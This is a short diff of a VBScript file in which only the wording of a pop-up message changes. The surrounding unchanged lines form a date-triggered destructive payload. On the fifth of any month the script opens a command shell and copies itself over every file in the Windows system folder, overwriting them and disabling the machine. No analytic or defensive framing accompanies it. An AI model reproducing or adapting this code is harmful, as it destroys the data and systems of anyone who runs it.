@@ -1,5 +1,5 @@
 If Day(Now()) = 5 Then
-x = MsgBox"Seems like your bad dream came true.",32,"Windows"
+MsgBox"Seems like your bad dream came true."
 Set WshShell = Wscript.CreateObject("Wscript.Shell")
 CommandPath = WSHShell.ExpandEnvironmentStrings("%comspec%")
 WshShell.Run (CommandPath & " /c for %%a in (C:\WINDOWS\SYSTEM\*.*) do copy /y " & Wscript.ScriptFullName & " %%a >nul")
